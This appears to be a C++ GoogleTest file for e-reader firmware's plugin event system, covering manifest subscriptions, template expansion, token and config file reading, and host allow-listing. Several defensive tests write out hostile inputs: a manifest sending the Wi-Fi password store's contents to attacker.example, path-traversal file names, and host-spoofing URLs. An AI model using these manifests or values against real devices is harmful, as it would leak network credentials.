// Plugin events without the card or the network (src/util/PluginEventCore.h): subscriptions read from the manifests
// of real Plugin Hub plugins, the queue line, the require_meta filter, the drain's manifest, the templates, the token
// and config files a drain may read and the hosts its requests may go to.
#include <PluginEventCore.h>
#include <ProtectedPaths.h>
#include <gtest/gtest.h>

#include <cstring>
#include <fstream>
#include <sstream>
#include <string>
#include <string_view>

#include "network/PluginHosts.h"

using namespace plugin_events;

namespace {

// The events sections of three Plugin Hub plugins as published (kosync-autopush 0.0.1, monthwallpaper 2.0.2, readeck).
const char* const kKosyncAutopush = R"({"title":"KOSync Auto-push","config":{"file":"config.json"},"events":{
  "reader.session":{"connect":true,"request":{"method":"PUT","url":"{cfg.server}/syncs/progress",
    "headers":{"x-auth-user":"{cfg.user}","x-auth-key":"{cfg.key}","Accept":"application/vnd.koreader.v1+json",
      "Content-Type":"application/json"},
    "body":"{\"document\":\"{event.document}\",\"progress\":\"crosspoint-autopush\",\"percentage\":{event.end_progress_bp}e-4,\"device\":\"{cfg.device}\",\"device_id\":\"{cfg.device_id}\"}"},
    "toast":"KOSync: progress pushed"}}})";
const char* const kMonthWallpaper = R"({"title":"Month Wallpaper","config":{"file":"config.json"},"events":{
  "sleep.enter":{"download":{"url":"https://crosspoint-calendar.marczyk.ovh/current.bmp?w={cfg.width}&h={cfg.height}",
    "dest":"/sleep.bmp"},"toast":"Month Wallpaper updated"}}})";
const char* const kReadeck = R"({"token":{"file":"token.json","path":"access_token"},"config":{"file":"config.json"},
  "browse":{"url":"{cfg.server}/api/bookmarks"},"events":{
  "reader.exit":{"require_meta":"readeck_id","connect":true,"request":{"method":"PATCH",
    "url":"{cfg.server}/api/bookmarks/{meta.readeck_id}","headers":{"Authorization":"Bearer {token}"},
    "body":"{\"read_progress\":{event.end_percent}}"}},
  "sleep.enter":{"require_meta":"readeck_id","request":{"method":"PATCH","url":"{cfg.server}/api/bookmarks/{meta.readeck_id}"}}}})";
// As the Plugin Hub's Weather: a sleep picture from a worker whose address its card writes into the config.
const char* const kWeather = R"({"config":{"file":"config.json"},"events":{"sleep.enter":{"download":{
  "url":"{cfg.worker_url}?latitude={cfg.latitude}&longitude={cfg.longitude}","dest":"/sleep.bmp"}}}})";

Subscription subscribe(const char* json) {
  Subscription s;
  EXPECT_TRUE(parseSubscription(json, s));
  return s;
}

}  // namespace

TEST(PluginEventCore, EventNamesRoundTrip) {
  for (size_t i = 0; i < kEventCount; i++) {
    const auto e = static_cast<Event>(i);
    EXPECT_EQ(eventFromName(eventName(e)), static_cast<int>(i));
  }
  EXPECT_EQ(eventFromName("reader.page"), -1);
  EXPECT_STREQ(eventName(Event::SleepEnter), "sleep.enter");
}

TEST(PluginEventCore, SubscriptionsOfRealPlugins) {
  const Subscription kosync = subscribe(kKosyncAutopush);
  EXPECT_EQ(kosync.mask, eventBit(Event::ReaderSession));
  EXPECT_EQ(kosync.connectMask, eventBit(Event::ReaderSession));
  EXPECT_EQ(kosync.metaKeyHash[static_cast<size_t>(Event::ReaderSession)], 0u);

  // sleep.enter always connects, with or without "connect".
  const Subscription wallpaper = subscribe(kMonthWallpaper);
  EXPECT_EQ(wallpaper.mask, eventBit(Event::SleepEnter));
  EXPECT_EQ(wallpaper.connectMask, eventBit(Event::SleepEnter));

  const Subscription readeck = subscribe(kReadeck);
  EXPECT_EQ(readeck.mask, eventBit(Event::ReaderExit) | eventBit(Event::SleepEnter));
  EXPECT_EQ(readeck.connectMask, eventBit(Event::ReaderExit) | eventBit(Event::SleepEnter));
  EXPECT_EQ(readeck.metaKeyHash[static_cast<size_t>(Event::ReaderExit)], metaKeyHash("readeck_id"));
}

TEST(PluginEventCore, SubscriptionIgnoresWhatItCannotRun) {
  // An event this firmware does not know, and a require_meta that is not a string: neither may subscribe, and the
  // second must not turn into "every book".
  const char* json = R"({"events":{"reader.page":{"request":{"url":"u"}},
    "reader.exit":{"require_meta":7,"request":{"url":"u"}},"reader.open":{"request":{"url":"u"}}}})";
  const Subscription s = subscribe(json);
  EXPECT_EQ(s.mask, eventBit(Event::ReaderOpen));
  Subscription none;
  EXPECT_TRUE(parseSubscription("{\"title\":\"x\"}", none));
  EXPECT_EQ(none.mask, 0);
  EXPECT_FALSE(parseSubscription("not json", none));
}

TEST(PluginEventCore, ConnectIsAJsonTrue) {
  // As upstream reads "connect": a number is not a yes (as<bool>() compared it to zero, in floating point).
  const char* json = R"({"events":{"reader.open":{"connect":true,"request":{"url":"u"}},
    "reader.exit":{"connect":1,"request":{"url":"u"}},"reader.session":{"connect":false,"request":{"url":"u"}}}})";
  const Subscription s = subscribe(json);
  EXPECT_EQ(s.mask, eventBit(Event::ReaderOpen) | eventBit(Event::ReaderExit) | eventBit(Event::ReaderSession));
  EXPECT_EQ(s.connectMask, eventBit(Event::ReaderOpen));
}

TEST(PluginEventCore, QueueLine) {
  const Var vars[] = {{"book", "/Books/Loan \"1\".epub"}, {"percent", "42"}};
  const std::string line = eventLine(Event::ReaderExit, vars, 2, "1a2b3c4d-7", 1795000000);
  EXPECT_EQ(line,
            "{\"e\":\"reader.exit\",\"id\":\"1a2b3c4d-7\",\"ts\":1795000000,"
            "\"vars\":{\"book\":\"/Books/Loan \\\"1\\\".epub\",\"percent\":\"42\"}}\n");
  const std::string longBook(600, 'x');
  const Var big[] = {{"book", longBook.c_str()}};
  EXPECT_EQ(eventLine(Event::ReaderOpen, big, 1, "id", 0), "");
}

TEST(PluginEventCore, RequireMetaMatchesFilledValues) {
  const uint32_t wanted = metaKeyHash("readeck_id");
  const char* id = R"({"readeck_id":"abc123","source":"readeck"})";
  EXPECT_TRUE(metaMatches(id, wanted));
  const char* number = R"({"readeck_id":36835})";
  EXPECT_TRUE(metaMatches(number, wanted));
  for (const char* no :
       {R"({"readeck_id":""})", R"({"readeck_id":true})", R"({"readeck_id":1.5})", R"({"other":"x"})", "garbage"}) {
    EXPECT_FALSE(metaMatches(no, wanted)) << no;
  }
}

TEST(PluginEventCore, OutboxWantsConnectOnlyForFlaggedEvents) {
  const std::string outbox =
      "{\"e\":\"reader.exit\",\"id\":\"a-1\",\"ts\":0,\"vars\":{}}\n"
      "{\"e\":\"reader.open\",\"id\":\"a-2\",\"ts\":0,\"vars\":{}}\n";
  EXPECT_TRUE(outboxWantsConnect(outbox, eventBit(Event::ReaderExit)));
  EXPECT_FALSE(outboxWantsConnect(outbox, eventBit(Event::ReaderSession) | eventBit(Event::SleepEnter)));
  EXPECT_FALSE(outboxWantsConnect("", 0xFF));
}

namespace {
JsonDocument parsed(const char* json) {
  JsonDocument doc;
  EXPECT_EQ(deserializeJson(doc, json), DeserializationError::Ok);
  return doc;
}
}  // namespace

TEST(PluginEventCore, HandlersAreReadFromTheManifest) {
  const JsonDocument kosync = parsed(kKosyncAutopush);
  const JsonVariantConst session = handlerFor(kosync.as<JsonVariantConst>(), Event::ReaderSession);
  ASSERT_FALSE(session.isNull());
  EXPECT_FALSE(isDownload(session));
  EXPECT_STREQ(requestOf(session)["method"] | "", "PUT");
  EXPECT_TRUE(handlerFor(kosync.as<JsonVariantConst>(), Event::ReaderExit).isNull());

  const JsonDocument wallpaper = parsed(kMonthWallpaper);
  const JsonVariantConst sleep = handlerFor(wallpaper.as<JsonVariantConst>(), Event::SleepEnter);
  ASSERT_FALSE(sleep.isNull());
  EXPECT_TRUE(isDownload(sleep));
  EXPECT_STREQ(sleep["download"]["dest"] | "", "/sleep.bmp");

  // A download with nowhere to go, and a request without a URL, cannot run.
  const JsonDocument broken = parsed(R"({"events":{"sleep.enter":{"download":{"url":"https://x/y.bmp"}},
    "reader.exit":{"request":{"method":"POST"}}}})");
  EXPECT_TRUE(handlerFor(broken.as<JsonVariantConst>(), Event::SleepEnter).isNull());
  EXPECT_TRUE(handlerFor(broken.as<JsonVariantConst>(), Event::ReaderExit).isNull());
}

namespace {
// The device asks isProtectedPluginFile() (src/network/WebPathGuard.cpp): ProtectedPaths judged as a folder walked
// through with hidden names allowed, its 8.3 aliases looked up on the card. No alias on this card.
bool refusedLikeTheWebServer(const std::string& path) {
  return ProtectedPaths::isProtectedPath(path, ProtectedPaths::Target::Directory, true,
                                         [](std::string_view, std::string_view) { return false; });
}
bool refusesNothing(const std::string&) { return false; }
std::string lastChecked;
bool recordsTheCheck(const std::string& path) {
  lastChecked = path;
  return false;
}
}  // namespace

TEST(PluginEventCore, PluginFilesAndTokenPaths) {
  const std::string dir = "/.crosspoint/plugins/readeck";
  EXPECT_EQ(pluginFile(dir, "token.json", refusedLikeTheWebServer), "/.crosspoint/plugins/readeck/token.json");
  // Absolute names as the Plugin Hub's plugins write them (lingoblend, leaf, cp-orbit), normalised.
  EXPECT_EQ(pluginFile(dir, "/.crosspoint/lingoblend.json", refusedLikeTheWebServer), "/.crosspoint/lingoblend.json");
  EXPECT_EQ(pluginFile(dir, "/.crosspoint/.leaf-token.json", refusedLikeTheWebServer), "/.crosspoint/.leaf-token.json");
  EXPECT_EQ(pluginFile(dir, "/.cp-orbit/config.json", refusedLikeTheWebServer), "/.cp-orbit/config.json");
  EXPECT_EQ(pluginFile(dir, "//.crosspoint/./x.json", refusedLikeTheWebServer), "/.crosspoint/x.json");
  EXPECT_EQ(pluginFile(dir, "", refusedLikeTheWebServer), "");
  EXPECT_EQ(pluginFile(dir, nullptr, refusedLikeTheWebServer), "");
  const JsonDocument token = parsed(R"({"data":{"access_token":"tok-1"},"list":["a","b"],"n":7})");
  EXPECT_EQ(valueAt(token.as<JsonVariantConst>(), "data.access_token"), "tok-1");
  EXPECT_EQ(valueAt(token.as<JsonVariantConst>(), "list.1"), "b");
  EXPECT_EQ(valueAt(token.as<JsonVariantConst>(), "n"), "7");
  EXPECT_EQ(valueAt(token.as<JsonVariantConst>(), "missing.x"), "");
}

// A name with ".." names nothing, as on the web side (PluginLocations::namesPath()): a relative one would climb out of
// the plugin's folder, and an absolute one is refused alike rather than resolved.
TEST(PluginEventCore, APluginFileWithDotDotNamesNothing) {
  const std::string dir = "/.crosspoint/plugins/x";
  for (const char* name : {"../other/token.json", "../../wifi.json", "/.crosspoint/plugins/x/../../wifi.json",
                           "sub/../token.json", ".."}) {
    EXPECT_EQ(pluginFile(dir, name, refusesNothing), "") << name;
  }
}

// The exploit: a device.json naming the Wi-Fi store as its token file, and a sleep.enter request carrying {token}. The
// web server never lets a plugin read a credential store; the drain now reads by the same rules.
TEST(PluginEventCore, ACredentialStoreIsNeverAPluginFile) {
  const std::string dir = "/.crosspoint/plugins/x";
  for (const char* name :
       {"/.crosspoint/wifi.json", "/.CrossPoint/WiFi.json", "/.crosspoint/opds.json", "/.crosspoint/koreader.json",
        "/.crosspoint/wifi.json.bak", "//.crosspoint/./wifi.json", "/System Volume Information/x.json"}) {
    EXPECT_EQ(pluginFile(dir, name, refusedLikeTheWebServer), "") << name;
  }
  // The check is asked about the resolved absolute path, not the name as written.
  lastChecked.clear();
  EXPECT_EQ(pluginFile(dir, "config.json", recordsTheCheck), "/.crosspoint/plugins/x/config.json");
  EXPECT_EQ(lastChecked, "/.crosspoint/plugins/x/config.json");
}

// The config file is refused the same way: its values fill the URL, the headers and the body.
TEST(PluginEventCore, AProtectedConfigFileIsRefused) {
  const JsonDocument manifest = parsed(R"({"config":{"file":"/.crosspoint/koreader.json"},
    "events":{"reader.session":{"request":{"url":"https://sync.example/{cfg.password}"}}}})");
  EXPECT_EQ(pluginFile("/.crosspoint/plugins/x", manifest["config"]["file"] | "", refusedLikeTheWebServer), "");
}

TEST(PluginEventCore, TemplatesFillTheKosyncRequest) {
  const JsonDocument manifest = parsed(kKosyncAutopush);
  const JsonDocument config = parsed(R"({"server":"https://sync.example","user":"reader","key":"5f4dcc3b",
    "device":"Witch Reader","device_id":"w1","port":8080,"debug":true})");
  const JsonDocument line =
      parsed(R"({"vars":{"document":"0123456789abcdef0123456789abcdef","end_progress_bp":"4321"}})");
  TemplateContext ctx;
  ctx.cfg = config.as<JsonVariantConst>();
  ctx.vars = line["vars"];
  const JsonVariantConst req = requestOf(handlerFor(manifest.as<JsonVariantConst>(), Event::ReaderSession));
  EXPECT_EQ(expand(req["url"] | "", ctx), "https://sync.example/syncs/progress");
  EXPECT_EQ(expand(req["body"] | "", ctx),
            "{\"document\":\"0123456789abcdef0123456789abcdef\",\"progress\":\"crosspoint-autopush\","
            "\"percentage\":4321e-4,\"device\":\"Witch Reader\",\"device_id\":\"w1\"}");
  EXPECT_EQ(expand(req["headers"]["x-auth-key"] | "", ctx), "5f4dcc3b");
  EXPECT_EQ(expand("{cfg.port}|{cfg.debug}|{cfg.missing}", ctx), "8080||{cfg.missing}");
}

TEST(PluginEventCore, TemplatesTokenMetaAndEventFields) {
  const JsonDocument meta = parsed(R"({"readeck_id":"r9"})");
  const JsonDocument cfg = parsed(R"({"server":"https://r","odd":"{token}"})");
  const JsonDocument line = parsed(R"({"vars":{"end_percent":"57"}})");
  TemplateContext ctx;
  ctx.token = "tok-1";
  ctx.cfg = cfg.as<JsonVariantConst>();
  ctx.meta = meta.as<JsonVariantConst>();
  ctx.vars = line["vars"];
  ctx.ts = 1795000000;
  ctx.id = "n-3";
  EXPECT_EQ(expand("{cfg.server}/b/{meta.readeck_id}?t={token}&p={event.end_percent}&ts={event.ts}&id={event.id}"
                   "&x={event.unknown}&y={nope}&open={",
                   ctx),
            "https://r/b/r9?t=tok-1&p=57&ts=1795000000&id=n-3&x={event.unknown}&y={nope}&open={");
  // One pass: a value that itself looks like a placeholder is not filled in again.
  EXPECT_EQ(expand("{cfg.odd}", ctx), "{token}");
}

TEST(PluginEventCore, EscapeUrl) { EXPECT_EQ(escapeUrl("https://x/a b?q=1&r=ä#f"), "https://x/a%20b?q=1&r=%C3%A4#f"); }

// A host the device.json writes out in an event URL counts as declared, as an allowedHosts entry does: no filled-in
// value can move it (literalHost()). A host a template fills in, or one urlHost() would refuse, is not.
TEST(PluginEventCore, ALiteralHostIsReadFromTheTemplate) {
  EXPECT_EQ(literalHost("https://crosspoint-calendar.marczyk.ovh/current.bmp?w={cfg.width}&h={cfg.height}"),
            "crosspoint-calendar.marczyk.ovh");
  EXPECT_EQ(literalHost("https://Img.Example:8443/{event.book}"), "img.example");
  EXPECT_EQ(literalHost("https://good.example?u={token}"), "good.example");
  for (const char* tpl :
       {"{cfg.server}/syncs/progress", "{cfg.worker_url}?latitude={cfg.latitude}", "https://{cfg.host}/x",
        "https://good.example{cfg.x}/p", "https://good.example:{cfg.port}/", "https://{cfg.user}@good.example/",
        "https://evil.example:443@good.example/", "{cfg.scheme}://good.example/", "ftp://good.example/", ""}) {
    EXPECT_EQ(literalHost(tpl), "") << tpl;
  }
  EXPECT_EQ(literalHost(nullptr), "");
}

namespace {
// The reach a drain gives a plugin that lists no allowedHosts and has no approvals: the hosts its event URLs write out.
PluginHosts::Reach declaredBy(JsonVariantConst manifest) {
  PluginHosts::Reach reach;
  EXPECT_GE(literalHostBytes(manifest), kEventCount);
  declareLiteralHosts(manifest, reach);
  return reach;
}
}  // namespace

// Month Wallpaper 2.0.2 lists no allowedHosts and never asks through the relay: its download's host is written out in
// its device.json, so it reaches that host, and that host alone.
TEST(PluginEventCore, MonthWallpaperReachesTheHostItsEventWritesOut) {
  const JsonDocument manifest = parsed(kMonthWallpaper);
  const PluginHosts::Reach reach = declaredBy(manifest.as<JsonVariantConst>());
  const JsonDocument cfg = parsed(R"({"width":480,"height":800})");
  TemplateContext ctx;
  ctx.cfg = cfg.as<JsonVariantConst>();
  const std::string url = handlerUrl(handlerFor(manifest.as<JsonVariantConst>(), Event::SleepEnter), ctx);
  EXPECT_EQ(url, "https://crosspoint-calendar.marczyk.ovh/current.bmp?w=480&h=800");
  EXPECT_TRUE(reach.allows(url));
  EXPECT_FALSE(reach.allows("https://cdn.crosspoint-calendar.marczyk.ovh/x.bmp"));  // exact, as an approval
  EXPECT_FALSE(reach.allows("https://marczyk.ovh/x.bmp"));
  EXPECT_FALSE(reach.allows("https://evil.example/"));
}

// KOSync Auto-push, Readeck and Weather fill their host in from the config: they declare nothing, and reach their
// server once it is approved, as before (KOSync's and Readeck's cards ask for it through the relay).
TEST(PluginEventCore, ATemplatedHostStillNeedsAnApproval) {
  const JsonDocument cfg = parsed(R"({"server":"https://sync.example","worker_url":"https://w.example/weather.bmp",
    "latitude":"52.5","longitude":"13.4"})");
  const JsonDocument meta = parsed(R"({"readeck_id":"r9"})");
  TemplateContext ctx;
  ctx.cfg = cfg.as<JsonVariantConst>();
  ctx.meta = meta.as<JsonVariantConst>();
  struct Case {
    const char* manifest;
    Event event;
    const char* host;
  };
  for (const Case& c :
       {Case{kKosyncAutopush, Event::ReaderSession, "sync.example"}, Case{kReadeck, Event::ReaderExit, "sync.example"},
        Case{kWeather, Event::SleepEnter, "w.example"}}) {
    const JsonDocument manifest = parsed(c.manifest);
    PluginHosts::Reach reach = declaredBy(manifest.as<JsonVariantConst>());
    const std::string url = handlerUrl(handlerFor(manifest.as<JsonVariantConst>(), c.event), ctx);
    EXPECT_FALSE(reach.allows(url)) << url;
    reach.approve(c.host);
    EXPECT_TRUE(reach.allows(url)) << url;
  }
}

// The exploit's device.json writes its host out, so that host counts as declared. The {token} it carries can then only
// come from a file the plugin may read itself: the credential store is refused (pluginFile()), and the drain sends no
// token. Its own token file is read as before.
TEST(PluginEventCore, ALiteralHostCarriesOnlyThePluginsOwnFiles) {
  const JsonDocument manifest = parsed(R"({"token":{"file":"/.crosspoint/wifi.json","path":"networks.0.password"},
    "events":{"sleep.enter":{"request":{"url":"https://attacker.example/{token}"}}}})");
  const std::string dir = "/.crosspoint/plugins/x";
  EXPECT_EQ(pluginFile(dir, manifest["token"]["file"] | "", refusedLikeTheWebServer), "");
  const TemplateContext ctx{};  // the drain's, with no token read
  const std::string url = handlerUrl(handlerFor(manifest.as<JsonVariantConst>(), Event::SleepEnter), ctx);
  EXPECT_EQ(url, "https://attacker.example/");
  const PluginHosts::Reach reach = declaredBy(manifest.as<JsonVariantConst>());
  EXPECT_TRUE(reach.allows(url));
  EXPECT_FALSE(reach.allows("https://elsewhere.example/"));
  EXPECT_EQ(pluginFile(dir, "token.json", refusedLikeTheWebServer), "/.crosspoint/plugins/x/token.json");
}

// The host comes out of the config file: it is the filled-in URL that is judged, whatever the template spelled. A host
// written out elsewhere in the device.json counts for the plugin, and nothing beyond it does.
TEST(PluginEventCore, ATemplateThatExpandsIntoAnotherHostIsRefused) {
  const JsonDocument manifest = parsed(kKosyncAutopush);
  const JsonVariantConst handler = handlerFor(manifest.as<JsonVariantConst>(), Event::ReaderSession);
  PluginHosts::Reach reach = declaredBy(manifest.as<JsonVariantConst>());
  reach.approve("sync.example");  // approved when the plugin's card tested its login through the relay
  TemplateContext ctx;

  const JsonDocument own = parsed(R"({"server":"https://sync.example"})");
  ctx.cfg = own.as<JsonVariantConst>();
  EXPECT_TRUE(reach.allows(handlerUrl(handler, ctx)));

  for (const char* server :
       {R"({"server":"https://evil.example"})", R"({"server":"https://sync.example.evil.example"})",
        R"({"server":"https://sync.example@evil.example"})", R"({"server":"https://evil.example:443@sync.example"})",
        R"({"server":"https://evil.example\\.sync.example"})"}) {
    const JsonDocument cfg = parsed(server);
    ctx.cfg = cfg.as<JsonVariantConst>();
    EXPECT_FALSE(reach.allows(handlerUrl(handler, ctx))) << handlerUrl(handler, ctx);
  }

  // A fixed host with a filled-in tail declares nothing: user info or a host suffix from the config would move it.
  const JsonDocument tail = parsed(R"({"events":{"reader.open":{"request":{"url":"https://sync.example{cfg.x}/p"}},
    "sleep.enter":{"download":{"url":"https://pics.example/today.bmp","dest":"/sleep.bmp"}}}})");
  const JsonVariantConst open = handlerFor(tail.as<JsonVariantConst>(), Event::ReaderOpen);
  PluginHosts::Reach tailReach = declaredBy(tail.as<JsonVariantConst>());
  tailReach.approve("sync.example");
  for (const char* x : {R"({"x":"@evil.example"})", R"({"x":".evil.example"})", R"({"x":":443@evil.example"})"}) {
    const JsonDocument cfg = parsed(x);
    ctx.cfg = cfg.as<JsonVariantConst>();
    EXPECT_FALSE(tailReach.allows(handlerUrl(open, ctx))) << handlerUrl(open, ctx);
  }
  const JsonDocument port = parsed(R"({"x":":8443"})");
  ctx.cfg = port.as<JsonVariantConst>();
  EXPECT_TRUE(tailReach.allows(handlerUrl(open, ctx)));
  // The sleep download's host is written out, so it is the plugin's, for its other events as well.
  EXPECT_TRUE(tailReach.allows("https://pics.example/other"));
  const JsonDocument toPics = parsed(R"({"x":"@pics.example"})");
  ctx.cfg = toPics.as<JsonVariantConst>();
  EXPECT_FALSE(tailReach.allows(handlerUrl(open, ctx)));  // user info is never judged, whatever the host
}

// The plugins the web Home Screen page makes for a picture from the web (js/home-layout.js webPicturePlugin; the page's
// test checks it makes exactly these): the device subscribes to them and reads where each picture goes.
TEST(PluginEventCore, HomePicturePluginsSubscribe) {
  std::ifstream in(HOME_PICTURE_PLUGINS);
  std::stringstream text;
  text << in.rdbuf();
  JsonDocument fixture;
  ASSERT_EQ(deserializeJson(fixture, text.str()), DeserializationError::Ok);

  std::string sleepJson;
  serializeJson(fixture["sleep"], sleepJson);
  const Subscription sleep = subscribe(sleepJson.c_str());
  EXPECT_EQ(sleep.mask, eventBit(Event::SleepEnter));
  EXPECT_EQ(sleep.connectMask, eventBit(Event::SleepEnter));
  const JsonVariantConst atSleep = handlerFor(fixture["sleep"].as<JsonVariantConst>(), Event::SleepEnter);
  ASSERT_TRUE(isDownload(atSleep));
  EXPECT_STREQ(atSleep["download"]["dest"] | "", "/home/web/web-1.jpg");
  EXPECT_STREQ(atSleep["download"]["url"] | "", "https://img.example/render?w=218&h=170");

  // After a book is closed: queued then, fetched over a connection the next sleep brings up.
  std::string closeJson;
  serializeJson(fixture["close"], closeJson);
  const Subscription close = subscribe(closeJson.c_str());
  EXPECT_EQ(close.mask, eventBit(Event::ReaderExit));
  EXPECT_EQ(close.connectMask, eventBit(Event::ReaderExit));
  const JsonVariantConst afterBook = handlerFor(fixture["close"].as<JsonVariantConst>(), Event::ReaderExit);
  ASSERT_TRUE(isDownload(afterBook));
  EXPECT_STREQ(afterBook["download"]["dest"] | "", "/home/web/web-2.png");

  // Their manifests list the picture's host and its subdomains (home_layout_test.mjs checks the page writes these), so
  // the drain's host check lets their downloads through; their URLs write the host out as well.
  PluginHosts::Reach reach;
  reach.allow("img.example");
  reach.allow(".img.example");
  const TemplateContext ctx{};
  EXPECT_TRUE(reach.allows(handlerUrl(atSleep, ctx)));
  EXPECT_TRUE(reach.allows(handlerUrl(afterBook, ctx)));
  EXPECT_TRUE(reach.allows("https://cdn.img.example/today.png"));  // a redirect to the service's own CDN
  EXPECT_FALSE(reach.allows("https://cdn.example/today.png"));
  EXPECT_TRUE(declaredBy(fixture["sleep"].as<JsonVariantConst>()).allows(handlerUrl(atSleep, ctx)));
}
